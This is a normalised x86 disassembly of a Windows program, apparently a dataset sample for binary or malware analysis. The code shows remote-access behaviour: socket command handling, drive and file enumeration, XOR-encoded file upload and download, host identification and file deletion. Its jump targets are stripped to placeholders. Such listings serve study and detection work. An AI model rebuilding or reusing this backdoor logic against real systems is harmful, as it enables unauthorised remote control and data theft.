lea esi [ edi + edi * 4 + 0x3a98 ]
shl esi 0x1
call [ GetTickCount@IAT ]
test edi edi
mov [ rw-data ] eax
jle r-xdata
push 0x1
pop eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
push 0x0
sub eax ebx
push eax
mov eax [ esp + 0x18 ]
add eax ebx
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_19@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
retn
add ebx eax
mov eax edi
sub eax ebx
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
and [ rw-data ] 0x0
push 0x1
call [ Sleep@IAT ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_402502
push ebp
mov ebp esp
sub esp 0x200
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov al [ esi ]
cmp al 0x41
je r-xdata
push 0x200
lea eax [ ebp - 0x200 ]
push edi
push eax
call sub_405a60
add esp 0xc
push [ esi + 0x1 ]
push 0x1
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_4028f7
lea eax [ ebp - 0x200 ]
push eax
call sub_405450
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_402475
add esp 0x24
test eax eax
jne r-xdata
cmp al 0x7b
je r-xdata
push [ ebp + 0xc ]
push esi
call sub_402475
pop ecx
pop ecx
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
jne r-xdata
pop edi
pop esi
leave
retn
cmp [ rw-data ] edi
je r-xdata
push [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] edi
call [ Ordinal_WSOCK32_3@IAT ]
call sub_402bdc
test eax eax
je r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] edi
jne r-xdata
sub_4025d4
push ebp
mov ebp esp
push ecx
push ecx
push edi
push 0x3e800
call sub_4054cb
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
leave
retn
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
mov eax [ ebp - 0x8 ]
push rw-data
push edi
and [ eax + edi ] 0x0
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push rw-data
push 0x50
push esi
call sub_401eea
add esp 0x20
test eax eax
je r-xdata
jmp r-xdata
push esi
push rw-data
call sub_405540
pop ecx
pop ecx
push edi
call sub_405f9f
pop ecx
pop esi
sub_402674
push rw-data
call sub_404c48
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push rw-data
call sub_404a0e
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_404ac9
pop ecx
pop ecx
retn
sub_4026db
sub esp 0x10c
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ SHGetSpecialFolderPathA@IAT ]
push edi
push 0x0
push 0x2
push eax
push 0x0
call esi
mov ebx rw-data
push rw-data
lea eax [ esp + 0x1c ]
push ebx
push eax
mov ebp rw-data
lea eax [ esp + 0x24 ]
push ebp
push eax
call sub_405630
mov edi [ DeleteFileA@IAT ]
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call edi
push 0x0
lea eax [ esp + 0x1c ]
push 0x2
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push ebx
push eax
lea eax [ esp + 0x24 ]
push ebp
push eax
call sub_405630
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call edi
push 0x0
lea eax [ esp + 0x1c ]
push 0x2
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push ebx
push eax
lea eax [ esp + 0x24 ]
push ebp
push eax
call sub_405630
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call edi
push 0x0
lea eax [ esp + 0x1c ]
push 0x2
push eax
push 0x0
call esi
push rw-data
lea eax [ esp + 0x1c ]
push ebx
push eax
lea eax [ esp + 0x24 ]
push ebp
push eax
call sub_405630
add esp 0x14
lea eax [ esp + 0x18 ]
push eax
call edi
push 0x1
lea eax [ esp + 0x18 ]
pop ebx
xor edi edi
push eax
push edi
push edi
push sub_403322
push edi
push edi
mov [ rw-data ] ebx
call [ CreateThread@IAT ]
mov esi [ Sleep@IAT ]
push 0x32
mov [ rw-data ] edi
mov [ rw-data ] edi
call esi
call sub_402652
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
call sub_4020fb
test eax eax
jne r-xdata
call sub_402674
call sub_402163
test eax eax
jne r-xdata
push 0x249f0
jmp r-xdata
call sub_4023cd
neg eax
sbb eax eax
inc eax
mov [ rw-data ] eax
call sub_401424
mov [ rw-data ] eax
call sub_402bdc
test eax eax
je r-xdata
push 0x2710
jmp r-xdata
call esi
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] edi
cmp eax edi
mov [ rw-data ] edi
je r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
push eax
push 0x8004667e
push [ rw-data ]
call [ Ordinal_WSOCK32_12@IAT ]
and [ rw-data ] 0x0
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
call sub_4031a2
push 0x3e8
call esi
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
mov [ rw-data ] edi
push 0x927c0
cmp [ rw-data ] edi
je r-xdata
push ebx
call esi
jmp r-xdata
mov ebp 0x97
cmp [ rw-data ] edi
je r-xdata
call [ GetTickCount@IAT ]
push 0x3e8
mov [ rw-data ] eax
call esi
dec ebp
jne r-xdata
jmp r-xdata
sub_4028f7
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call sub_40bf7a
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call sub_405550
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call sub_405550
push [ ebp + 0xc ]
push esi
call sub_405550
lea eax [ ebp - 0x10 ]
push eax
push esi
call sub_405550
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call sub_405540
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call sub_405550
push rw-data
push esi
call sub_405550
push [ ebp + 0xc ]
push esi
call sub_405550
lea eax [ ebp - 0x10 ]
push eax
push esi
call sub_405550
push rw-data
push esi
call sub_405550
add esp 0x28
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push rw-data
push esi
call sub_405550
pop ecx
pop ecx
push rw-data
push esi
call sub_405550
pop ecx
pop ecx
pop esi
leave
retn
push rw-data
push esi
call sub_405550
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call sub_40bf7a
lea eax [ ebp - 0x10 ]
push eax
push esi
call sub_405550
push rw-data
push esi
call sub_405550
add esp 0x24
sub_4029f6
push ebp
mov ebp esp
mov eax 0x2008
call sub_405f70
push ebx
push esi
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call sub_405e40
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
je r-xdata
sub_402aa7
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_402ad0
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
add eax ecx
mov dl [ eax ]
sub dl cl
xor dl 0xb
sub dl 0x12
inc ecx
cmp ecx [ esp + 0x8 ]
mov [ eax ] dl
jl r-xdata
sub_402af2
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ GetComputerNameA@IAT ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
jmp r-xdata
push rw-data
call sub_405540
pop ecx
pop ecx
leave
retn
sub_402b84
push ebp
mov ebp esp
sub esp 0x80
push [ ebp + 0xc ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sub_405630
lea eax [ ebp - 0x80 ]
push eax
call sub_405450
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_402475
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
push [ rw-data ]
call sub_4029f6
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp eax 0x3e800
jge r-xdata
push 0x1
pop eax
leave
retn
sub_402bdc
push ebp
mov ebp esp
sub esp 0x120
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
mov esi [ Ordinal_WSOCK32_9@IAT ]
push edi
mov [ rw-data ] ebx
mov edi rw-data
jne r-xdata
mov ax [ rw-data ]
push eax
call esi
push rw-data
mov [ ebp - 0xe ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_401e51
add esp 0x10
test eax eax
je r-xdata
mov ax [ rw-data ]
push eax
call esi
mov [ ebp - 0xe ] ax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_401e51
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x1
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
push ebx
push sub_4033ca
push ebx
push ebx
call [ CreateThread@IAT ]
cmp eax ebx
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x1
pop eax
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
call sub_4035ed
call sub_40175d
jmp r-xdata
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_402b84
pop ecx
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
test eax eax
je r-xdata
sub_402d22
push ebp
mov ebp esp
mov eax 0x2008
call sub_405f70
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2008 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2008 ] al
jmp r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2007 ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_402502
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2008 ] 0x59
jne r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_405b85
push edi
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push eax
call sub_4060b6
add esp 0x14
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_403a3c
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2007 ] eax
push eax
lea eax [ ebp - 0x2008 ]
push eax
call sub_402502
pop ecx
mov eax ebx
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp ebx esi
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push [ ebp - 0x8 ]
call sub_405ab8
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp - 0x8 ]
call sub_405ab8
pop ecx
push edi
push [ ebp + 0xc ]
call [ SetFileAttributesA@IAT ]
push [ ebp + 0xc ]
call [ DeleteFileA@IAT ]
push 0x1
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2008 ]
push esi
push 0x1
push eax
call sub_405fce
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
lea eax [ ebp - 0x2008 ]
push esi
push eax
call sub_402aa7
lea eax [ ebp - 0x2008 ]
push ebx
push eax
call sub_402475
add esp 0x28
test eax eax
je r-xdata
sub_402ea1
push ebp
mov ebp esp
sub esp 0x51c
push ebx
push esi
push edi
xor ebx ebx
push 0x10
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_405a60
lea eax [ ebp - 0x11c ]
push ebx
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x11c ] bl
call sub_401721
mov eax [ rw-data ]
mov esi rw-data
push esi
mov ecx [ eax ]
lea edi [ eax + 0x4 ]
lea eax [ ebp - 0x517 ]
mov [ ebp - 0x4 ] ecx
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x51c ] 0x7d
call sub_405540
push esi
call sub_405450
mov esi eax
mov eax [ rw-data ]
add esi 0x6
push edi
mov [ ebp + esi - 0x51c ] eax
add esi 0x4
call sub_404cb1
add esp 0x28
cmp eax 0xffffffff
je r-xdata
push ebx
push edi
call [ SetFileAttributesA@IAT ]
push edi
call [ DeleteFileA@IAT ]
mov [ ebp + esi - 0x51c ] ebx
add esi 0x4
cmp [ ebp - 0x11c ] bl
je r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x51c ]
push esi
push eax
mov [ ebp - 0x51b ] esi
call sub_402502
pop ecx
pop ecx
lea eax [ ebp - 0x18 ]
push 0x10
push eax
lea eax [ ebp + esi - 0x51c ]
push eax
call sub_405720
add esi 0x10
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp + esi - 0x51c ]
push eax
call sub_405540
lea eax [ ebp - 0x11c ]
push eax
call sub_405450
add esp 0x18
add esi eax
cmp [ ebp - 0x4 ] eax
jae r-xdata
mov edi eax
add esi 0x4
sub edi [ ebp - 0x4 ]
cmp [ ebp - 0x11c ] bl
mov [ ebp + esi - 0x520 ] edi
je r-xdata
add edi esi
mov [ ebp - 0x51b ] edi
lea eax [ ebp - 0x11c ]
push eax
call sub_405450
add eax edi
pop ecx
lea eax [ eax + esi + 0x10 ]
mov [ ebp - 0x51b ] eax
jmp r-xdata
push rw-data
push [ ebp - 0x8 ]
call sub_405b85
push ebx
mov edi eax
push [ ebp - 0x4 ]
push edi
call sub_4060b6
mov esi 0x400
push edi
push esi
lea eax [ ebp - 0x51c ]
push 0x1
push eax
call sub_405fce
mov [ ebp - 0x4 ] eax
push eax
lea eax [ ebp - 0x51c ]
push eax
call sub_402475
add esp 0x2c
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x51c ]
push esi
push eax
call sub_402502
pop ecx
test eax eax
pop ecx
jne r-xdata
push edi
call sub_405ab8
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] esi
push edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_405ab8
pop ecx
push ebx
push [ ebp - 0x8 ]
call [ SetFileAttributesA@IAT ]
push [ ebp - 0x8 ]
call [ DeleteFileA@IAT ]
cmp [ ebp - 0x11c ] bl
je r-xdata
push esi
lea eax [ ebp - 0x51c ]
push 0x1
push eax
call sub_405fce
mov [ ebp - 0x4 ] eax
push eax
lea eax [ ebp - 0x51c ]
push eax
call sub_402475
add esp 0x18
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push 0x10
push eax
lea eax [ ebp - 0x51c ]
push eax
call sub_405720
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x50c ]
push eax
call sub_405540
lea eax [ ebp - 0x11c ]
push eax
call sub_405450
add eax 0x10
push eax
lea eax [ ebp - 0x51c ]
push eax
call sub_402475
add esp 0x20
jmp r-xdata
test eax eax
je r-xdata
sub_4030f9
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call sub_405540
lea eax [ ebp - 0x400 ]
push eax
call sub_405450
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_403a3c
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_405540
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_405550
mov eax [ rw-data ]
add eax esi
push eax
call sub_405450
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
sub_4031a2
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call sub_405720
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax 0x50
jg r-xdata
sub eax 0x52
je r-xdata
je r-xdata
call sub_403719
dec eax
je r-xdata
call sub_403c82
jmp r-xdata
sub eax 0x41
je r-xdata
push 0x1
pop eax
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x100 ] 0x5a
call sub_405450
add eax 0x5
push esi
mov [ ebp - 0xff ] eax
lea eax [ ebp - 0xfb ]
push eax
call sub_405540
push esi
call sub_405450
add eax 0x5
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_402502
add esp 0x18
call sub_4030e6
jmp r-xdata
sub eax 0x3
je r-xdata
cmp [ rw-data ] esi
mov [ rw-data ] 0x1
je r-xdata
dec eax
je r-xdata
call sub_403a61
jmp r-xdata
dec eax
dec eax
je r-xdata
call sub_403737
jmp r-xdata
dec eax
dec eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub eax 0x23
jne r-xdata
call sub_4030f9
jmp r-xdata
dec eax
je r-xdata
call sub_402ea1
jmp r-xdata
sub eax 0x5
je r-xdata
jmp r-xdata
sub_4032c3
mov eax sub_40c010
call sub_40542c
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
call sub_404cee
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
sub_403322
mov eax sub_40c01c
call sub_40542c
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
mov [ ebp - 0x10 ] esp
call esi
mov edi eax
mov [ rw-data ] edi
mov [ ebp - 0x14 ] edi
cmp [ rw-data ] 0x0
mov ebx 0x1b7740
je r-xdata
call sub_4020fb
test eax eax
je r-xdata
call esi
sub eax [ rw-data ]
cmp eax ebx
jle r-xdata
mov ebx 0x2bf20
call esi
mov edi eax
call sub_402163
call esi
sub eax [ ebp - 0x14 ]
cmp eax 0x2710
jle r-xdata
and [ rw-data ] 0x0
call esi
mov [ rw-data ] eax
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
call esi
mov [ ebp - 0x14 ] eax
call esi
sub eax edi
cmp eax 0xea60
jle r-xdata
sub_4033ca
mov eax sub_40c028
call sub_40542c
push ecx
mov eax 0x2004
call sub_405f70
push ebx
push esi
mov esi [ ebp - 0x14 ]
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0x1
mov [ ebp - 0x4 ] ebx
mov [ rw-data ] ebx
pop edi
mov al [ ebp - 0x2014 ]
sub esi 0x5
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_403506
cmp eax ebx
je r-xdata
push eax
lea eax [ ebp - 0x2014 ]
push eax
push [ rw-data ]
call sub_405720
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
mov [ rw-data ] bl
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x2014 ]
push 0x5
push eax
call sub_403572
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
mov [ rw-data ] ebx
mov esi [ ebp - 0x2013 ]
cmp esi 0x5
jl r-xdata
cmp esi ebx
jg r-xdata
push edi
call [ Sleep@IAT ]
jmp r-xdata
mov [ rw-data ] edi
jmp r-xdata
push edi
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2014 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2014 ]
push esi
push eax
call sub_403572
pop ecx
cmp eax 0xffffffff
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ rw-data ] bl
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
jmp r-xdata
sub_403506
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ Sleep@IAT ]
xor ebx ebx
test eax eax
jle r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call esi
jmp r-xdata
call [ GetTickCount@IAT ]
cmp [ ebp - 0x1 ] 0xd
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_403572
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov eax 0x2000
xor esi esi
xor ebp ebp
cmp ebx eax
push edi
jle r-xdata
test ebx ebx
jle r-xdata
mov ebx eax
mov eax ebx
mov eax ebx
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x1c ]
add eax esi
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
mov edi eax
test edi edi
jg r-xdata
call [ GetTickCount@IAT ]
add esi edi
mov [ rw-data ] eax
xor ebp ebp
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebp
inc ebp
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi ebx
jl r-xdata
sub_4035ed
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call sub_405540
push esi
call sub_405450
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_402502
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_405450
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call sub_405540
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call sub_405540
lea eax [ ebp - 0x88 ]
push eax
call sub_405450
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_403737
push ebp
mov ebp esp
sub esp 0x214
push [ rw-data ]
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push eax
call sub_405720
push 0x5c
push [ rw-data ]
call sub_405ba0
push eax
call sub_40397e
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call sub_405ba0
add esp 0x20
test eax eax
je r-xdata
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call sub_405550
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call sub_4054cb
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_403912
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call sub_405f9f
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_402502
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_4039ca
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call sub_405540
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402aa7
push ebx
push edi
call sub_402475
push edi
call sub_405f9f
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402aa7
push ebx
push edi
call sub_402475
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_4038c6
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call sub_405f9f
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_402aa7
push esi
push edi
call sub_402475
add esp 0x18
